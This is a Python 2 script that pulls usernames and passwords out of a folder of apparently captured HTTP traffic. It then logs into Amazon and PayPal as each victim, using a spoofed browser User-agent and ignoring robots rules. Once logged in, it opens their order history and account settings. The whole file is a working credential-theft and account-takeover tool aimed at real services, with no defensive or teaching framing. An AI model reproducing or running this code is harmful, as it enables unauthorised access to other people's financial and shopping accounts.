import os, mechanize, re

directory='./HTTPS/'
uLabel=['username=', 'user=']
pLabel=['password=', 'pass=']
endChar=['&','\n']

def createWorkList():
    global directory
    global uLabel
    global pLabel
    
    workList=[]
    
    for validFile in (os.listdir(directory)):
        currentScanFile=directory+validFile
        with open(currentScanFile, 'r') as fileContents:
            data=fileContents.read()
            i=0
            j=0
            uCheck=re.search(uLabel[i], data)
            pCheck=re.search(pLabel[j], data)
            if(uCheck and pCheck):
                workList.append(validFile)
            elif(uCheck and pCheck is None):
                j=j+1
                pCheck=re.search(pLabel[j], data)
                if(pCheck):
                    workList.append(validFile)
            elif(pCheck and uCheck is None):
                i=i+1
                uCheck=re.search(uLabel[i], data)
                if(uCheck):
                    workList.append(validFile)
    return workList

def createUsernameList(wl):
    global uLabel
    global endChar
    
    usernameList=[]
    
    i=0
    while(i<len(wl)):
        currentScanFile=directory+wl[i]
        with open(currentScanFile, 'r') as fileContents:
            data=fileContents.read()
            for j in range(2):
                k=0
                uStartCheck=re.search(uLabel[j], data)          
                if(uStartCheck):
                    uStart=data.index(uLabel[j])+len(uLabel[j])
                    uEndCheck=re.search(endChar[k], data)
                    if(uEndCheck):
                        uEnd=data.find(endChar[k], uStart)
                        username=data[uStart:uEnd]
                        usernameList.append(username)

                    else:
                        k=k+1
                        uEndCheck=re.search(endChar[k], data)
                        uEnd=data.find(endChar[k], uStart)
                        username=data[uStart:uEnd]
                        usernameList.append(username)                   
        i=i+1
    return usernameList

    
def createPasswordList(wl):
    global pLabel
    global endChar
    
    passwordList=[]
    
    i=0
    while(i<len(wl)):
        currentScanFile=directory+wl[i]
        with open(currentScanFile, 'r') as fileContents:
            data=fileContents.read()
            for j in range(2):
                k=0
                pStartCheck=re.search(pLabel[j], data)         
                if(pStartCheck):
                    pStart=data.index(pLabel[j])+len(pLabel[j])
                    pEnd=data.find(endChar[k],pStart,pStart+30)
                    if(pEnd is not -1):
                        password=data[pStart:pEnd]
                        passwordList.append(password)

                    else:
                        k=k+1
                        pEnd=data.find(endChar[k],pStart,pStart+30)
                        if(pEnd is not -1):
                            password=data[pStart:pEnd]
                            passwordList.append(password)                
        i=i+1
    return passwordList

def createCredentialPairList(ul,pl):
    credPairList=[]
    i=0
    while(i<len(ul)):
        credPairList.append([ul[i],pl[i]])
        i=i+1
    return credPairList

def amazon(cpl):
    i=0
    while(i<len(cpl)):
        br=mechanize.Browser()  
        br.set_handle_robots(False)  
        br.addheaders=[('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13')]  
   
        sign_in=br.open('https://www.amazon.com/gp/sign-in.html')  
        print br.title()
        br.select_form(name='signIn')  
        br['email']=cpl[i][0] + '@gmail.com'
        br['password']=cpl[i][1]
        logged_in=br.submit() 
        br.open('https://www.amazon.com/gp/css/order-history/ref=nav_youraccount_orders')
        print br.title()
        br.open('https://www.amazon.com/gp/flex/sign-out.html/ref=nav_youraccount_signout')
        print br.title()
        i=i+1

def paypal(cpl):
    i=0
    while(i<len(cpl)):
        br=mechanize.Browser()  
        br.set_handle_robots(False)  
        br.addheaders = [('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'), ('Accept', '*/*')]
   
        sign_in=br.open('https://www.paypal.com/signin/')  
        print sign_in.geturl()
        br.select_form('login')  
        br['login_email']=cpl[i][0] + '@gmail.com'
        br['login_password']=cpl[i][1]
        logged_in=br.submit() 
        br.open('https://www.paypal.com/myaccount/settings/')
        print br.title()
        br.open('https://www.paypal.com/myaccount/logout')
        print logged_in.geturl()
        i=i+1
wl=createWorkList()
ul=createUsernameList(wl)
pl=createPasswordList(wl)
cpl=createCredentialPairList(ul,pl)
print cpl
amazon(cpl)
paypal(cpl)

